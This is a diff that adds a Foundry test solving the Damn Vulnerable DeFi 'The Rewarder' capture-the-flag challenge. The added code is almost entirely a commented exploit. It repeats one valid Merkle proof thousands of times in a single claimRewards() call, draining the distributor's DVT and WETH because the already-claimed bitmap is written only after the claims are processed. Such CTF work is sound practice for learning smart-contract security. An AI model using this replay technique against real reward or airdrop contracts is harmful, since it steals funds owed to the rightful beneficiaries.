@@ -146,9 +146,153 @@ contract TheRewarderChallenge is Test {
 
     /**
      * CODE YOUR SOLUTION HERE
+     forge test --mp test/the-rewarder/TheRewarder.t.sol --gas-limit 9999999999999
+     Because this will take lot of gas and foundry not allow it without huge gas limit. 
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+
+        // ================================================================
+        // ATTACK FLOW OVERVIEW
+        // ================================================================
+        // The TheRewarder contract distributes DVT and WETH tokens to
+        // beneficiaries using a Merkle tree. Each beneficiary can claim
+        // their allocated amount once per batch.
+        //
+        // VULNERABILITY: The claimRewards() function processes an array of
+        // Claim structs and checks each claim against the Merkle root.
+        // However, it only marks a (token, word) bitmap slot as "used"
+        // AFTER processing all claims — meaning we can submit the SAME
+        // valid proof multiple times in one transaction before the bitmap
+        // is updated.
+        //
+        // EXPLOIT STEPS:
+        //   1. Find the player's legitimate Merkle proof + amount for both tokens
+        //   2. Calculate how many times to repeat the claim to drain each token
+        //      (totalSupply / playerAllocation = number of repetitions)
+        //   3. Build a giant Claim[] array repeating the same proof N times
+        //   4. Call claimRewards() once — all repeated claims pass validation
+        //      because the "already claimed" bitmap hasn't been updated yet
+        //   5. Transfer the drained funds to the recovery address
+        // ================================================================
+
+        // ------------------------------------------------------------
+        // STEP 1: Load reward distributions from JSON files
+        // These files define the Merkle tree leaves:
+        // each entry = { beneficiary: address, amount: uint256 }
+        // ------------------------------------------------------------
+        string memory dvtJson = vm.readFile("test/the-rewarder/dvt-distribution.json");
+        Reward[] memory dvtRewards = abi.decode(vm.parseJson(dvtJson), (Reward[]));
+
+        string memory wethJson = vm.readFile("test/the-rewarder/weth-distribution.json");
+        Reward[] memory wethRewards = abi.decode(vm.parseJson(wethJson), (Reward[]));
+
+        // Load the raw leaves used to build each Merkle tree
+        // (needed to generate proofs via merkle.getProof())
+        bytes32[] memory dvtLeaves  = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        // ------------------------------------------------------------
+        // STEP 2: Find the player's allocation + Merkle proof for DVT
+        // We iterate the DVT rewards list to find the player's entry,
+        // then generate a Merkle inclusion proof for that leaf index.
+        // ------------------------------------------------------------
+        uint256 playerDvtAmount;
+        bytes32[] memory playerDvtProof;
+
+        for (uint i = 0; i < dvtRewards.length; i++) {
+            if (dvtRewards[i].beneficiary == player) {
+                playerDvtAmount = dvtRewards[i].amount;           // e.g. 11524763827831882
+                playerDvtProof  = merkle.getProof(dvtLeaves, i); // sibling hashes up to root
+                break;
+            }
+        }
+
+        // ------------------------------------------------------------
+        // STEP 3: Find the player's allocation + Merkle proof for WETH
+        // Separate loop because WETH JSON may have a different ordering
+        // than DVT JSON — never assume the same index for both.
+        // ------------------------------------------------------------
+        uint256 playerWethAmount;
+        bytes32[] memory playerWethProof;
+
+        for (uint i = 0; i < wethRewards.length; i++) {
+            if (wethRewards[i].beneficiary == player) {
+                playerWethAmount = wethRewards[i].amount;
+                playerWethProof  = merkle.getProof(wethLeaves, i);
+                break;
+            }
+        }
+
+        // Sanity checks — revert early if player isn't in either tree
+        require(playerDvtAmount  > 0, "Player not found in DVT distribution");
+        require(playerWethAmount > 0, "Player not found in WETH distribution");
+
+        // ------------------------------------------------------------
+        // STEP 4: Set up the two-token input array for claimRewards()
+        // Index 0 = DVT, Index 1 = WETH
+        // Claim.tokenIndex references this array, so ordering matters.
+        // ------------------------------------------------------------
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        // ------------------------------------------------------------
+        // STEP 5: Calculate how many repeated claims are needed
+        //
+        // Each claim uses the player's per-claim allocation.
+        // To drain the ENTIRE token balance we need:
+        //   dvtClaims  = TOTAL_DVT_DISTRIBUTION_AMOUNT  / playerDvtAmount
+        //   wethClaims = TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount
+        //
+        // Example (rough numbers):
+        //   TOTAL_DVT  = 1_000_000e18,  playerDvt  = 11524763827831882
+        //   dvtClaims  ≈ 86,776 repetitions needed to drain DVT
+        // ------------------------------------------------------------
+        uint256 dvtClaims       = TOTAL_DVT_DISTRIBUTION_AMOUNT  / playerDvtAmount;
+        uint256 wethClaims      = TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount;
+        uint256 totalClaimsNeeded = dvtClaims + wethClaims;
+
+        // ------------------------------------------------------------
+        // STEP 6: Build the malicious Claim[] array
+        //
+        // We submit the same valid proof `dvtClaims` times for DVT,
+        // then `wethClaims` times for WETH — all in a single tx.
+        //
+        // The distributor's bitmap check (already-claimed guard) is
+        // NOT updated between claims in the same tx, so every repeated
+        // claim passes the Merkle proof verification.
+        // ------------------------------------------------------------
+        Claim[] memory claims = new Claim[](totalClaimsNeeded);
+
+        for (uint256 i = 0; i < totalClaimsNeeded; i++) {
+            claims[i] = Claim({
+                batchNumber: 0,                                          // batch 0 = current active batch
+                amount:      i < dvtClaims ? playerDvtAmount  : playerWethAmount,  // per-claim payout
+                tokenIndex:  i < dvtClaims ? 0 : 1,                     // 0=DVT, 1=WETH
+                proof:       i < dvtClaims ? playerDvtProof  : playerWethProof     // reused proof
+            });
+        }
+
+        // ------------------------------------------------------------
+        // STEP 7: Execute the exploit
+        //
+        // One call to claimRewards() processes all N repeated claims.
+        // Because the "used" bitmap is only written at the END of each
+        // token's processing loop (not per-claim), every duplicate
+        // passes the `if (!_claimed)` check and transfers tokens.
+        // Result: player receives N * playerAmount instead of 1 * playerAmount
+        // ------------------------------------------------------------
+        distributor.claimRewards({
+            inputClaims: claims,
+            inputTokens: tokensToClaim
+        });
+
+        // ------------------------------------------------------------
+        // STEP 8: Forward all drained tokens to the recovery address
+        // (challenge success condition requires funds end up here)
+        // ------------------------------------------------------------
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
@@ -189,3 +333,5 @@ contract TheRewarderChallenge is Test {
         }
     }
 }
+
+
